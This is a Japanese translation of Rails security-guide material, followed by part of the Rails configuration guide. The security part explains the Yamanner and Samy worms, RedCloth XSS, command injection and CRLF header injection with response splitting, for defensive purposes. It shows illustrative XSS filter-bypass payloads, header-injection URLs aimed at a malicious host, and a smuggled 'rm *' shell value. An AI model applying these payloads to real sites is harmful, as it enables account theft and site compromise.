以下は[Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [ワーム](http://groovin.net/stuff/yammer.txt) からの抜粋です。
この攻撃は2006年6月11日に行われたもので、Webメールインターフェイスを使用するワームの最初の事例です。
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
このワームはYahooのHTML/JavaScriptフィルタの穴をつきました。このフィルタは元来、JavaScriptが仕込まれる可能性のあるtarget属性とonload属性をすべてフィルタするようになっていました。
しかし残念ながらこのフィルタは1度しか実行されなかったため、ワームが潜むonload属性が除去されずにそのまま残ってしまいました。
この事例から、ブラックリストフィルタが完全になることは永遠にありえないこと、そしてHTML/JavaScriptをWebアプリケーションで許可することに困難が伴う理由をおわかりいただけると思います。
webmailワームの他の概念実証的な事例としてNdujaを取り上げます。
詳細については[Rosario Valotta'の論文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)を参照してください。
どちらのwebmailワームもメールアドレスを収集することを目的としており、犯罪的ハッカーが不正な収入を得るのに使われることがあります。
2006年12月、実在する34,000人のユーザー名とパスワードが[MySpaceへのフィッシング攻撃](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)によって盗み出されました。
この攻撃では「login_home_index_html」という名前をURLに持つプロファイルページが捏造され、それによってこのURLはユーザーからは実にもっともらしく見えました。
MySpaceの本物のWebページコンテンツは特殊なHTML/CSSによって覆い隠され、独自の偽ログインページを代りに表示しました。
MySpaceのSamyワームについては次のCSSインジェクションの節で説明します。
### CSSインジェクション
INFO: _CSSインジェクションは実際にはJavaScriptのインジェクションであると言えます。これは、IEや特定のバージョンのSafariなどで、CSSに含まれるJavaScriptの実行が許可されているからです。
CSSインジェクションの説明に最適なのは、かの有名な[MySpace Samyワーム](http://namb.la/popular/tech.html)です。
このワームは、攻撃者であるSamyのプロファイルページを開くだけで自動的にSamyに友達リクエストを送信するというものです。
他愛もないいたずらだったかもしれませんが、Samyのもとには数時間のうちに百万件以上の友達リクエストが集まり、それによってMySpaceに膨大なトラフィックが発生してサイトがオフラインになってしまいました。
以下はこのワームに関する技術的な解説です。
MySpaceでは多くのタグをブロックしていましたが、CSSについては禁止していなかったので、ワームの作者はCSSに以下のようなJavaScriptを仕込みました。
<div style="background:url('javascript:alert(1)')">
ここでスクリプトの正味の部分(ペイロード)はstyle属性に置かれます。
一重引用符と二重引用符が既に両方使用されているので、このペイロードでは引用符が使用できません。
しかしJavaScriptにはどんな文字列もコードとして実行できてしまうeval()関数があります。この関数は強力ですが危険です。
<div id="mycode" expr="alert('hah!')" 
style="background:url('javascript:eval(document.all.mycode.expr)')">
eval()関数はブラックリストベースの入力フィルタの実装者にとっては悪夢のようなものです。この関数を使われてしまうと、たとえば以下のように「innerHTML」という単語をstyle属性に隠しておくことができてしまうからです。
alert(eval('document.body.inne' + 'rHTML'));
次の問題は、MySpaceは"javascript"という単語をフィルタしていましたが、「java&lt;NEWLINE&gt;script」と書くことでこのフィルタを回避できてしまったことでした。
次の問題は、ワームの作者がCSRFセキュリティトークンを利用していたことでした。
これがなければ友達リクエストをばらまくということはできない相談だったでしょう。
ワーム作者は、ユーザーが追加される直前にページに送信されたGETリクエストの結果を解析してCSRFトークンを得ていました。
最終的に4KBサイズのワームができあがり、作者は自分のプロファイルページにこれを注入しました。
[moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html)というCSSプロパティは、FirefoxなどのGeckoベースのブラウザではCSS経由でJavaScriptを注入する手段になる可能性があることが判明しています。
繰り返しますが、ブラックリストによるフィルタは永遠に不完全なままにしかなりません。
_Webアプリケーションの色や画像をカスタマイズできるようにしたいのであれば、ユーザーに色や画像を選ばせ、Webアプリケーションの側でCSSをビルドするようにしましょう_ 。ユーザーがCSSを直接カスタマイズできるような作りにはしないでください。
どうしても必要であれば、ホワイトリストベースのCSSフィルタとしてRailsの`sanitize()`メソッドを使用することもできます。
### テキスタイルインジェクション
セキュリティ上の理由からHTML以外のテキストフォーマット機能を提供したいのであれば、何らかのマークアップ言語を採用し、それをサーバー側でHTMLに変換するようにしてください。
[RedCloth](http://redcloth.org/)はRuby用に開発されたマークアップ言語の一種ですが、気を付けて使用しないとXSSに対しても脆弱になります。
例を挙げます。RedClothは `_test_`というマークアップを&lt;em&gt;test&lt;em&gt;に変換します。この箇所のテキストはイタリックになります。
しかし、執筆当時の最新バージョンである3.0.4までのRedClothはXSSに関しても脆弱でした。
この重大なバグを取り除くには[最新のバージョン4](http://www.redcloth.org)を入手してください。
しかし新しいバージョンにも[若干のセキュリティバグ](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)があるため、対応策は未だに欠かせません。
バージョン3.0.4の例を以下に示します。
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
テキスタイルプロセッサによって作成されていないHTMLを除去するには、:filter_htmlオプションを使用してください。
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
ただしこのメソッドでは、仕様上一部のHTMLタグ(&lt;a&gt;など)が除去されません。
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
XSS対応策で既に述べたとおり、_RedClothは必ずホワイトリストフィルタと組み合わせて使用してください_ 。
### Ajaxインジェクション
NOTE: _通常のWebアプリケーション開発上で必要となるセキュリティ上の注意と同様の注意がAjaxに対しても必要です。
ただし1つ例外があります。ページヘの出力は、アクションがビューをレンダリングしない場合であってもエスケープされている必要があります。
もしXSSで汚染された文字列が戻り値に含まれていると、ブラウザで表示されたときに悪意のあるコードが実行されてしまいます。
すべての入力値は、h()メソッドを使用してエスケープしてください。
### コマンドラインインジェクション
NOTE: _ユーザーが入力したデータをコマンドラインのオプションに使用する場合は十分に注意してください。
Webアプリケーションが背後のOSコマンドを実行しなければならない場合、Rubyには`exec(コマンド)`、`syscall(コマンド)`、`system(コマンド)`、そしてバッククォート記法という方法が用意されています。
これのコマンド全体または一部にユーザー入力が使用されるようなことがある場合、特に注意が必要です。
これは、ほとんどのシェルでは、コマンドにセミコロン;や垂直バー|を追加することで、別のコマンドを簡単に結合することができてしまうためです。
対応策は、 _コマンドラインのパラメータを安全に渡せる`system(コマンド, パラメータ)`メソッドを使用することです。_
system("/bin/echo","hello; rm *")
# "hello; rm *"を実行してもファイルは削除されない
### ヘッダーインジェクション
WARNING: _HTTPヘッダは動的に生成されるものであり、特定の状況ではヘッダにユーザー入力が注入されることがあります。
これを使用して、にせのリダイレクト、XSS、HTTPレスポンス分割攻撃が行われる可能性があります。
HTTPリクエストヘッダで使用されているフィールドの中にはReferer、User-Agent (クライアント側ソフトウェア)、Cookieフィールドがあります。
Responseヘッダーには、たとえばステータスコード、Cookieフィールド、Locationフィールド (リダイレクト先を表す) があります。
これらのフィールド情報はユーザー側から提供されるものであり、さほど手間をかけずに操作できてしまいます。
_これらのフィールドもエスケープするようにしてください。
_ エスケープが必要になるのは、管理画面でUser-Agentヘッダを表示する場合などが考えられます。
さらに、 _ユーザー入力を部分的に元にしたレスポンスヘッダを生成するときに、自分が何をしているのかを正しく知っておくことが重要です。
_ たとえば、ユーザーを特定のページへリダイレクトして戻したいとします。
このとき、"referer"フィールドをフォームに導入して、指定のアドレスにリダイレクトしたとします。
redirect_to params[:referer]
ここで、Railsはその文字列をLocationヘッダフィールドに入れて302(リダイレクト)ステータスをブラウザに送信します。
悪意のあるユーザーがこのとき最初に行なうのは、以下のような操作です。
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
Rails 2.1.2より前のバージョン(およびRuby)に含まれるバグが原因で、ハッカーは以下のように任意のヘッダを注入できてしまいます。
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
上のURLにおける"%0d%0a"は"\r\n"がURLエンコードされたものであり、RubyにおけるCRLF文字です。
2番目の例では2つ目のLocationヘッダーフィールドが1つ目のものを上書きするため、以下のようなHTTPヘッダーが生成されます。
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
つまり、 _ヘッダーインジェクションにおける攻撃方法は、ヘッダーにCRLF文字を注入するというものなのです。
_ 攻撃者は偽のリダイレクトでどんなことができてしまうのでしょうか。
攻撃者は、ユーザーをフィッシングサイトにリダイレクトし(フィッシングサイトの見た目は本物そっくりに作っておきます)、ユーザーを再度ログインさせてそのログイン情報を攻撃者に送信することができます。
あるいは、フィッシングサイトからブラウザのセキュリティホールを経由して邪悪なソフトウェアを注入することもできます。
Rails 2.1.2ではこれらの文字を`redirect_to`メソッドのLocationフィールドからエスケープするようになりました。
_他のヘッダーフィールドでユーザー入力を使用する場合には、CRLFのエスケープを自分で実装することを忘れないようにしてください。
#### レスポンス分割
ヘッダーインジェクションが実行可能になってしまっている場合、レスポンス分割(response splitting)攻撃も同様に実行可能になっている可能性があります。
HTTPのヘッダーブロックの後ろには2つのCRLFが置かれてヘッダーブロックの終了を示し、その後ろに実際のデータ(通常はHTML)が置かれます。
レスポンス分割とは、ヘッダーフィールドに2つのCRLFを注入し、その後ろに邪悪なHTMLを配置するという手法です。
このときのレスポンスは以下のようになります。
HTTP/1.1 302 Found [最初は通常の302レスポンス]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Content-Type: text/html
HTTP/1.1 200 OK [ここより下は攻撃者によって作成された次の新しいレスポンス]
&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [任意の邪悪な入力が
Keep-Alive: timeout=15, max=100         リダイレクト先のページとして表示される]
Connection: Keep-Alive
Transfer-Encoding: chunked
特定の状況では、この邪悪なHTMLが標的ユーザーのブラウザで表示されることがあります。
ただし、おそらくKeep-Alive接続が有効になっていないとこの攻撃は効かないでしょう。多くのブラウザはワンタイム接続を使用しています。
かといって、Keep-Aliveが無効になっていることを当てにするわけにはいきません。
これはいずれの場合においても重大なバグです。 _ヘッダーインジェクションとレスポンス分割の可能性を排除するため、Railsを2.0.5または2.1.2にアップグレードする必要があります。
安全でないクエリ生成
-----------------------
Rackがクエリパラメータを解析(parse)する方法とActive Recordがパラメータを解釈する方法の組み合わせに問題があり、where句が`IS NULL`のデータベースクエリを本来の意図に反して生成することが可能になってしまっています。
([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ), [CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) および [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)) のセキュリティ問題への対応として、Railsの動作をデフォルトでセキュアにするために`deep_munge`メソッドが導入されました。
`deep_munge`が実行されなかった場合に攻撃者に利用される可能性のある脆弱なコードの例を以下に示します。
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
`params[:token]`が`[]`、`[nil]`、`[nil, nil, ...]`、`['foo', nil]`のいずれかの場合、`nil`チェックをパスするにもかかわらず、where句が`IS NULL`または`IN ('foo', NULL)`になってSQLクエリに追加されてしまいます。
Railsをデフォルトでセキュアにするために、`deep_munge`メソッドは一部の値を`nil`に置き換えます。
リクエストで送信された`JSON`ベースのパラメータがどのように見えるかを以下の表に示します。
| JSON                              | パラメータ               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => nil }`     |
| `{ "person": [null] }`            | `{ :person => nil }`     |
| `{ "person": [null, null, ...] }` | `{ :person => nil }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |
リスクと取扱い上の注意を十分理解している場合に限り、`deep_munge`をオフにしてアプリケーションを従来の動作に戻すことができます。
config.action_dispatch.perform_deep_munge = false
デフォルトのヘッダー
Railsアプリケーションから受け取るすべてのHTTPレスポンスには、以下のセキュリティヘッダーがデフォルトで含まれています。
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
デフォルトのヘッダーは`config/application.rb`で設定を変更できます。
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
あるいはヘッダーを除去することもできます。
config.action_dispatch.default_headers.clear
よく使用されるヘッダーのリストを以下に示します。
* X-Frame-Options
'DENY'を指定するとすべてのフレーミングが不許可になります。すべてのWebサイトについてフレーミングを許可するには'ALLOWALL'を指定します。
* X-XSS-Protection
XSS Auditorをオフにしたい場合は'0;'を指定します(レスポンスがリクエストパラメータからのスクリプトを含んでいる場合に便利です)。
* X-Content-Type-Options
_'nosniff' はRailsではデフォルトです。_ - ファイルのMIMEタイプをブラウザが推測しないようにします。
* X-Content-Security-Policy
[コンテンツタイプを読み込む元のサイトを制御するための強力なメカニズム](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)です。
* Access-Control-Allow-Origin
同一生成元ポリシーのバイパスとクロスオリジン(cross-origin)リクエストをサイトごとに許可します。
* Strict-Transport-Security
[ブラウザからサイトへの接続をセキュアなものに限って許可するかどうかを指定します](http://ja.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
利用環境のセキュリティ
----------------------
アプリケーションのコードや実行環境をセキュアにする方法については、本ガイドの範疇を超えます。
ただし、`config/database.yml`などに置かれるデータベース接続設定や、`config/secrets.yml`などに置かれるサーバーサイドの秘密キーのセキュリティは保つようにしてください。
これらのファイルや、その他重要な情報を含む可能性のあるファイルを、環境に合わせて複数のバージョンを使い分けることでさらなるアクセス制限を行なうことができます。
--------------------
激しく移り変わるセキュリティの動向に常に目を配り、最新の情報を入手するようにしてください。新しく登場した脆弱性を見逃すと、壊滅的な損害をこうむる可能性があります。
Railsのセキュリティ関連の追加リソースをご紹介します。
* Ruby on Railsセキュリティプロジェクトには定期的にセキュリティ情報が掲載されます: [http://www.rorsecurity.info](http://www.rorsecurity.info)
* Railsセキュリティ [メーリングリスト](http://groups.google.com/group/rubyonrails-security)を購読しましょう。
* [アプリケーションのその他の層についても最新に保ってください](http://secunia.com/) (週刊のニュースレターも発行しています)
* [優れたセキュリティブログ](http://ha.ckers.org/blog/)には[XSSチートシート](http://ha.ckers.org/xss.html)が掲載されています。
Rails アプリケーションを設定する
==============================
このガイドではRailsアプリケーションで利用可能な設定と初期化機能について説明いたします。
* Railsアプリケーションの動作を調整する方法
* アプリケーション開始時に実行したいコードを追加する方法
初期化コードの置き場所
Railsには初期化コードの置き場所が4箇所あります。
* `config/application.rb`
* 環境に応じた設定ファイル
* イニシャライザ
* アフターイニシャライザ
Rails実行前にコードを実行する
-------------------------
アプリケーションで何らかのコードを、Rails自体が読み込まれる前に実行する必要が生じることがまれにあります。その場合は、実行したいコードを`config/application.rb`ファイルの`require 'rails/all'`行より前に書いてください。
Railsコンポーネントを構成する
----------------------------
一般に、Railsの設定作業とはRails自身を設定することでもあると同時に、Railsのコンポーネントを設定することでもあります。
`config/application.rb`および環境固有の設定ファイル(`config/environments/production.rb`など)に設定を記入することで、Railsのすべてのコンポーネントにそれらの設定を渡すことができます。
たとえば、`config/application.rb`ファイルには以下の設定が含まれています。
config.autoload_paths += %W(#{config.root}/extras)
これはRails自身のための設定です。
設定をすべてのRailsコンポーネントに渡したい場合は、`config/application.rb`内の同じ`config`オブジェクトを使用して行なうことができます。
config.active_record.schema_format = :ruby
この設定は、特にActive Recordの設定に使用されます。
### Rails全般の設定
Rails全般に対する設定を行うには、`Rails::Railtie`オブジェクトを呼び出すか、`Rails::Engine`や`Rails::Application`のサブクラスを呼び出します。
* `config.after_initialize`にはブロックを渡すことができます。このブロックは、Railsによるアプリケーションの初期化が完了した _直後_ に実行されます。
アプリケーションの初期化作業には、フレームワーク自体の初期化、エンジンの初期化、そして`config/initializers`に記述されたすべてのアプリケーションイニシャライザの実行が含まれます。
ここで渡すブロックはrakeタスクとして_実行される_ ことにご注意ください。
このブロックは、他のイニシャライザによって設定される値を設定するのに便利です。
    config.after_initialize do
      ActionView::Base.sanitized_allowed_tags.delete 'div'
* `config.asset_host`はアセットを置くホストを設定します。
このメソッドは`config.action_controller.asset_host`を短縮したものです。
* `config.autoload_once_paths`は、サーバーへのリクエストごとにクリアされない定数を自動読込するパスの配列を引数に取ります。
この設定は`config.cache_classes`がfalseの場合に影響を受けます。`config.cache_classes`はdevelopmentモードでは`config.cache_classes`はデフォルトでオフです。
`config.cache_classes`がtrueの場合、すべての`config.autoload_once_paths`自動読み込みは一度しか行われません。
`config.autoload_once_paths`の配列に含まれる要素は、次で説明する`autoload_paths`にもまったく同じように含めておく必要があります。
`config.autoload_once_paths`のデフォルト値は、空の配列です。
* `config.autoload_paths`はRailsが定数を自動読込するパスを含む配列を引数に取ります。
`config.autoload_paths`のデフォルト値は、`app`以下のすべてのディレクトリです(訳注: Rails3からはautoload_pathの設定はデフォルトでは無効です)。
* `config.cache_classes`は、アプリケーションのクラスやモジュールをリクエストごとに再読み込みするか(=キャッシュしないかどうか)どうかを指定します。
config.cache_classes`のデフォルト値は、developmentモードではfalseなのでコードの更新がすぐ反映され、testモードとproductionモードではtrueなので動作が高速になります。
* `config.action_view.cache_template_loading`は、リクエストのたびにビューテンプレートを再読み込みするか(=キャッシュしないか)を指定します。
* `config.beginning_of_week`は、アプリケーションにおける週の初日を設定します。
引数には、曜日を表す正しいシンボルを渡します(`:monday`など)。
* `config.cache_store`はRailsでのキャッシュ処理に使用されるキャッシュストアを設定します。
指定できるオプションは次のシンボル`:memory_store`、`:file_store`、`:mem_cache_store`、`:null_store`のいずれか、またはキャッシュAPIを実装するオブジェクトです。
`tmp/cache`ディレクトリが存在する場合のデフォルトは`:file_store`に設定され、それ以外の場合のデフォルトは`:memory_store`に設定されます。
* `config.colorize_logging`は、出力するログ情報にANSI色情報を与えるかどうかを指定します。
デフォルトはtrueです。
* `config.consider_all_requests_local`はフラグです。
このフラグがtrueの場合、どのような種類のエラーが発生した場合にも詳細なデバッグ情報がHTTPレスポンスに出力され、アプリケーションの実行時コンテキストが`Rails::Info`コントローラによって`/rails/info/properties`に出力されます。
このフラグはdevelopmentモードとtestモードではtrue、productionモードではfalseに設定されます。
もっと細かく制御したい場合は、このフラグをfalseに設定してから、コントローラで`local_request?`メソッドを実装し、エラー時にどのデバッグ情報を出力するかをそこで指定してください。
* `config.console`を使用すると、コンソールで`rails console`を実行する時に使用されるクラスをカスタマイズできます。
このメソッドは`console`ブロックで使用するのが最適です。
    console do
      # このブロックはコンソールで実行されるときしか呼び出されない
      # 従ってここでpryを呼び出しても問題ない
      require "pry"
      config.console = Pry
* `config.dependency_loading`をfalseに設定すると、定数自動読み込み設定をオフにします。
このオプションが効くのは`config.cache_classes`がtrueの場合のみです(`config.cache_classes`はproductionモードではデフォルトでtrueです)。
ここにはアプリケーション、エンジン、Railsフレームワークを含むあらゆる登録済み名前空間が含まれます。
* `config.eager_load_namespaces`を使用して登録した名前は、`config.eager_load`がtrueのときに読み込まれます。
登録された名前空間は、必ず`eager_load!`メソッドに応答しなければなりません。
* `config.eager_load_paths`は、パスの配列を引数に取ります。Railsは、cache_classesがオンの場合にこのパスから事前一括読み込み(eager load)します。
デフォルトではアプリケーションの`app`ディレクトリ以下のすべてのディレクトリが対象です。
* `config.encoding`はアプリケーション全体のエンコーディングを指定します。
デフォルトはUTF-8です。
* `config.exceptions_app`は、例外が発生したときにShowExceptionミドルウェアによって呼び出されるアプリケーション例外を設定します。
デフォルトは`ActionDispatch::PublicExceptions.new(Rails.public_path)`です。
* `config.file_watcher`は、`config.reload_classes_only_on_change`がtrueの場合にファイルシステム上のファイル更新検出に使用されるクラスを指定します。
`ActiveSupport::FileUpdateChecker` APIに従う必要があります。
* `config.filter_parameters`は、パスワードやクレジットカード番号など、ログに出力したくないパラメータをフィルタで除外するために使用します。
パスワードを除外するアプリケーションフィルタを追加するには`config/initializers/filter_parameter_logging.rb`を`config.filter_parameters+=[:password]`に追加します。
* `config.force_ssl`は、`ActionDispatch::SSL`ミドルウェアを使用して、すべてのリクエストをHTTPSプロトコル下で実行するよう強制します。
* `config.log_formatter`はRailsロガーのフォーマットを定義します。
このオプションは、デフォルトでは`ActiveSupport::Logger::SimpleFormatter`のインスタンスを使用します。ただしproductionモードの場合のみ`Logger::Formatter`がデフォルトになります。
* `config.log_level`は、Railsのログ出力をどのぐらい詳細にするかを指定します。
* `config.log_tags`は、`request`オブジェクトが応答するメソッドのリストを引数に取ります。
これは、ログの行にデバッグ情報をタグ付けする場合に便利です。たとえばサブドメインやリクエストidを指定することができ、これらはマルチユーザーのproductionモードアプリケーションをデバッグするのに便利です。
* `config.logger`は、ロガーを指定します。指定されるロガーは、Log4rまたはRubyのデフォルトの`Logger`クラスのインターフェイスに従います。
* `config.middleware`は、アプリケーションで使用するミドルウェアをカスタマイズできます。
詳細については[ミドルウェアを設定する](#ミドルウェアを設定する)の節を参照してください。
* `config.reload_classes_only_on_change`は、監視しているファイルが変更された場合にのみクラスを再読み込みするかどうかを指定します。
デフォルトでは、autoload_pathで指定されたすべてのファイルが監視対象となり、デフォルトでtrueが設定されます。
`config.cache_classes`がオンの場合はこのオプションは無視されます。
`secrets.secret_key_base`メソッドは、改竄防止のために、アプリケーションのセッションを既知の秘密キーと照合するためのキーを指定するときに使います。
アプリケーションは`secrets.secret_key_base`を使用して、`config/secrets.yml`などに保存されるキーをランダムに初期化します。
デフォルトの設定とは異なり、WEBrickを使用してアプリケーションをproductionモードで実行したり(これは絶対にやらないでください)テストする場合はtrueに設定されます。
そうでないと、ページキャッシュが有効にならず、publicディレクトリ以下に常駐する静的ファイルへのリクエストが毎回Railsアプリケーションを経由してしまいます。
* `config.session_store`は、通常は`config/initializers/session_store.rb`で設定されるものであり、セッションを保存するクラスを指定します。
指定できる値は`:cookie_store`(デフォルト)、`:mem_cache_store`、`:disabled`です。
`:disabled`を指定すると、Railsでセッションが扱われなくなります。
カスタムセッションストアを指定することもできます。
    config.session_store :my_custom_store
カスタムストアは`ActionDispatch::Session::MyCustomStore`として定義する必要があります。
* `config.time_zone`はアプリケーションのデフォルトタイムゾーンを設定し、Active Recordで認識できるようにします。
### アセットを設定する
* `config.assets.enabled`は、アセットパイプラインを有効にするかどうかを指定します。
デフォルトはtrueです。
このオプションは`production`環境で使用するとデプロイ時に思わぬ動作をする可能性がありますので、development環境(`config/environments/development.rb`)で使用することをお勧めします。
* `config.assets.compress`は、コンパイル済みアセットを圧縮するかどうかを指定するフラグです。
`config/environments/production.rb`では明示的にtrueに設定されています。
* `config.assets.css_compressor`は、CSSの圧縮に使用するプログラムを定義します。
このオプションは、`sass-rails`を使用するとデフォルトで設定されます。
このオプションでは`:yui`という一風変わったオプションを指定できます。これは`yui-compressor` gemのことです。
* `config.assets.js_compressor`は、JavaScriptの圧縮に使用するプログラムを定義します。
指定できる値は`:closure`、`:uglifier`、`:yui`です。それぞれ`closure-compiler`、`uglifier`、`yui-compressor` gemに対応します。
* `config.assets.paths`には、アセット探索用のパスを指定します。
この設定オプションにパスを追加すると、アセットの検索先として追加されます。
* `config.assets.precompile`は、`application.css`と`application.js`以外に追加したいアセットがある場合に指定します。これらは`rake assets:precompile`を実行するときに一緒にプリコンパイルされます。
* `config.assets.prefix`はアセットを置くディレクトリを指定します。
デフォルトは`/assets`です。
* `config.assets.debug`は、デバッグ用にアセットの連結と圧縮をやめるかどうかを指定します。
`development.rb`ではデフォルトで`true`に設定されます。
* `config.assets.cache_store`は、Sprocketsで使用するキャッシュストアを定義します。
デフォルトは以下のとおりです。
* `config.assets.version`はMD5ハッシュ生成に使用されるオプション文字列です。
この値を変更すると、すべてのアセットファイルが強制的にリコンパイルされます。
* `config.assets.compile`は、production環境での動的なSprocketsコンパイルをオンにするかどうかをtrue/falseで指定します。
* `config.assets.logger`はロガーを引数に取ります。このロガーは、Log4のインターフェイスか、Rubyの`Logger`クラスに従います。
デフォルトでは、`config.logger`と同じ設定が使用されます。
`config.assets.logger`をfalseに設定すると、アセットのログ出力がオフになります
### ジェネレータの設定
`config.generators`メソッドを使用して、Railsで使用されるジェネレータを変更できます。
このメソッドはブロックを1つ取ります。
config.generators do |g|
  g.orm :active_record
  g.test_framework :test_unit
ブロックで使用可能なメソッドの完全なリストは以下のとおりです。
* `assets`は、scaffoldを生成するかどうかを指定します。
デフォルトは`true`です。
* `force_plural`は、モデル名を複数形にするかどうかを指定します。
デフォルトは`false`です。
* `helper`はヘルパーを生成するかどうかを指定します。
* `integration_tool`は、使用する統合ツールを定義します。
デフォルトは`nil`です。
* `javascripts`は、生成時にJavaScriptファイルへのフックをオンにするかどうかを指定します。
この設定は`scaffold`ジェネレータの実行中に使用されます。
* `javascript_engine`は、アセット生成時に(coffeeなどで)使用するエンジンを設定します。
* `orm`は、使用するORM (オブジェクトリレーショナルマッピング) を指定します。
デフォルトは`false`であり、この場合はActive Recordが使用されます。
* `resource_controller`は、`rails generate resource`の実行時にどのジェネレータを使用してコントローラを生成するかを指定します。
デフォルトは`:controller`です。
デフォルトは`:scaffold_controller`です。
* `stylesheets`は、ジェネレータでスタイルシートのフックを行なうかどうかを指定します。
この設定は`scaffold`ジェネレータの実行時に使用されますが。このフックは他のジェネレータでも使用されます。
* `stylesheet_engine`は、アセット生成時に使用される、sassなどのスタイルシートエンジンを指定します。
デフォルトは`:css`です。
* `test_framework`は、使用するテストフレームワークを指定します。
デフォルトは`false`であり、この場合はTest::Unitが使用されます。
* `template_engine`はビューのテンプレートエンジン(ERBやHamlなど)を指定します。
デフォルトは`:erb`です。
### ミドルウェアを設定する
どのRailsアプリケーションの背後にも、いくつかの標準的なミドルウェアが配置されています。development環境では、以下の順序でミドルウェアを使用します。
* `ActionDispatch::SSL`はすべてのリクエストにHTTPSプロトコルを強制します。
これは`config.force_ssl`を`true`にすると有効になります。
渡すオプションは`config.ssl_options`で設定できます。
* `ActionDispatch::Static`は静的アセットで使用されます。
* `Rack::Lock`は、アプリケーションをミューテックスでラップし、1度に1つのスレッドでしか呼び出されないようにします。
このミドルウェアは、`config.cache_classes`が`false`に設定されている場合のみ有効になります。
* `ActiveSupport::Cache::Strategy::LocalCache`は基本的なメモリバックアップ式キャッシュとして機能します。
このキャッシュはスレッドセーフではなく、単一スレッド用の一時メモリキャッシュとして機能することのみを意図していることにご注意ください。
* `Rack::Runtime`は`X-Runtime`ヘッダーを設定します。このヘッダーには、リクエストの実行にかかる時間(秒)が含まれます。
* `Rails::Rack::Logger`は、リクエストが開始されたことをログに通知します。
リクエストが完了すると、すべてのログをフラッシュします。
* `ActionDispatch::ShowExceptions`は、アプリケーションから返されるすべての例外をrescueし、リクエストがローカルであるか`config.consider_all_requests_local`が`true`に設定されている場合に適切な例外ページを出力します。
`config.action_dispatch.show_exceptions`が`false`に設定されていると、常に例外が出力されます。
* `ActionDispatch::RequestId`は、レスポンスで使用できる独自のX-Request-Idヘッダーを作成し、`ActionDispatch::Request#uuid`メソッドを有効にします。
* `ActionDispatch::RemoteIp`はIPスプーフィング攻撃が行われていないかどうかをチェックし、リクエストヘッダーから正しい`client_ip`を取得します。
この設定は`config.action_dispatch.ip_spoofing_check`オプションと`config.action_dispatch.trusted_proxies`オプションで変更可能です。
* `Rack::Sendfile`は、bodyが1つのファイルから作成されているレスポンスをキャッチし、サーバー固有のX-Sendfileヘッダーに差し替えてから送信します。
この動作は`config.action_dispatch.x_sendfile_header`で設定可能です。
* `ActionDispatch::Callbacks`は、リクエストに応答する前に、事前コールバックを実行します。
* `ActiveRecord::ConnectionAdapters::ConnectionManagement`は、リクエストごとにアクティブな接続をクリアします。ただしリクエスト環境で`rack.test`キーが`true`に設定されている場合を除きます。
* `ActiveRecord::QueryCache`は、リクエストによって生成されたすべてのSELECTクエリをキャッシュします。
INSERTまたはUPDATEが発生するとキャッシュはクリアされます。
* `ActionDispatch::Cookies`はリクエストに対応するcookieを設定します。
* `ActionDispatch::Session::CookieStore`は、セッションをcookieに保存する役割を担います。
`config.action_controller.session_store`の値を変更すると別のミドルウェアを使用できます。
これに渡されるオプションは`config.action_controller.session_options`を使用して設定できます。
* `ActionDispatch::Flash`は`flash`キーを設定します。
これは、`config.action_controller.session_store`に値が設定されている場合にのみ有効です。
* `ActionDispatch::ParamsParser`は、リクエストからパラメータを切り出して`params`に保存します。
* `Rack::MethodOverride`は、`params[:_method]`が設定されている場合にメソッドを上書きできるようにします。
これは、HTTPでPATCH、PUT、DELETEメソッドを使用できるようにするミドルウェアです。
`config.middleware.use`メソッドを使用すると、上記以外に独自のミドルウェアを追加することもできます。
config.middleware.use Magical::Unicorns
上の指定により、`Magical::Unicorns`ミドルウェアがスタックの最後に追加されます。
あるミドルウェアの前に別のミドルウェアを追加したい場合は`insert_before`を使用します。
あるミドルウェアの後に別のミドルウェアを追加したい場合は`insert_after`を使用します。
これらのミドルウェアは、まったく別のものに差し替えることもできます。
config.middleware.swap ActionController::Failsafe, Lifo::Failsafe
同様に、ミドルウェアをスタックから完全に取り除くこともできます。
config.middleware.delete "Rack::MethodOverride"
### i18nを設定する
以下のオプションはすべて`i18n`(internationalization: 国際化)ライブラリ用のオプションです。
* `config.i18n.available_locales`は、アプリケーションで利用できるロケールをホワイトリスト化します。
デフォルトでは、ロケールファイルにあるロケールキーはすべて有効になりますが、新しいアプリケーションの場合、通常は`:en`だけです。
